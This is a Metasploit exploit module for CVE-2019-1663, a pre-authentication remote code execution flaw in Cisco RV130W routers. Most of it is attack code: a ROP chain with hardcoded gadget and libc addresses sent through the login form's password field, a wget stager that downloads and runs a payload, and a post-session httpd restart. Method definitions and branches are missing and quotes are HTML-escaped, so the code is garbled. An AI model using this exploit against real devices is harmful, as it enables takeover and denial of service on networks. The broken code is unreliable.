# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# linux/armle/shell/bind_tcp -> segfault
# linux/armle/shell/reverse_tcp -> segfault
# linux/armle/shell_bind_tcp -> segfault
# linux/armle/shell_reverse_tcp -> segfault
#
class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Cisco RV130W Routers Management Interface Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        A vulnerability in the web-based management interface of the Cisco RV130W Wireless-N Multifunction VPN Router
         could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.

         The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
         An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.

         A successful exploit could allow the attacker to execute arbitrary code on the underlying operating
          system of the affected device as a high-privilege user.

        RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.

        Note: successful exploitation may not result in a session, and as such,
         on_new_session will never repair the HTTP server, leading to a denial-of-service condition.
      },
      &#039;Author&#039;         =>
        [
          &#039;Yu Zhang&#039;, # Initial discovery
          &#039;Haoliang Lu&#039;, # Initial discovery
          &#039;T. Shiomitsu&#039;, # Initial discovery
          &#039;Quentin Kaiser <kaiserquentin@gmail.com>&#039; # Vulnerability analysis & exploit dev
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        =>  %w[linux],
      &#039;Arch&#039;            =>  [ARCH_ARMLE],
      &#039;CmdStagerFlavor&#039; => %w{ wget },
      &#039;Privileged&#039;      => true, # BusyBox
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2019-1663&#039;],
          [&#039;BID&#039;, &#039;107185&#039;],
          [&#039;URL&#039;, &#039;https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex&#039;],
        ],
      &#039;DefaultOptions&#039; => {
          &#039;WfsDelay&#039; => 10,
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 443,
          &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;,
       },
      &#039;Targets&#039;        =>
        [
          [ &#039;Cisco RV130/RV130W < 1.0.3.45&#039;,
            {
              &#039;offset&#039;          => 446,
              &#039;libc_base_addr&#039;  => 0x357fb000,
              &#039;system_offset&#039;   => 0x0004d144,
              &#039;gadget1&#039;         => 0x00020e79, # pop {r2, r6, pc};
              &#039;gadget2&#039;         => 0x00041308, # mov r0, sp; blx r2;
              &#039;Arch&#039;            => ARCH_ARMLE,
            }
          ],
        ],
      &#039;DisclosureDate&#039;  => &#039;Feb 27 2019&#039;,
      &#039;DefaultTarget&#039;   => 0,
      &#039;Notes&#039; => {
        &#039;Stability&#039;   => [ CRASH_SERVICE_DOWN, ],
      },
    ))
  end

  def p(offset)
    [(target[&#039;libc_base_addr&#039;] + offset).to_s(16)].pack(&#039;H*&#039;).reverse
  end

    #All these gadgets are from /lib/libc.so.0
    shellcode = rand_text_alpha(target[&#039;offset&#039;]) +       # filler
      p(target[&#039;gadget1&#039;]) +
      p(target[&#039;system_offset&#039;]) +                        # r2
      rand_text_alpha(4) +                                # r6
      p(target[&#039;gadget2&#039;]) +                              # pc
      cmd
    shellcode
  end

  def send_request(buffer)
    begin
      send_request_cgi({
        &#039;uri&#039;     => &#039;/login.cgi&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;vars_post&#039; => {
              "submit_button": "login",
              "submit_type": "",
              "gui_action": "",
              "wait_time": 0,
              "change_action": "",
              "enc": 1,
              "user": rand_text_alpha_lower(5),
              "pwd": buffer,
              "sel_lang": "EN"
          }
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the router")
    end
  end

  def exploit
    print_status(&#039;Sending request&#039;)
    execute_cmdstager
  end

  def execute_command(cmd, opts = {})
    send_request(shellcode)
  end

  def on_new_session(session)
    # Given there is no process continuation here, the httpd server will stop
    # functioning properly and we need to take care of proper restart
    # ourselves.
    print_status("Reloading httpd service")
    reload_httpd_service = "killall httpd && cd /www && httpd && httpd -S"
      session.core.use &#039;stdapi&#039; unless session.ext.aliases.include? &#039;stdapi&#039;
      session.sys.process.execute &#039;/bin/sh&#039;, "-c \"#{reload_httpd_service}\""
    else
      session.shell_command(reload_httpd_service)
    end
  ensure
    super
  end
end

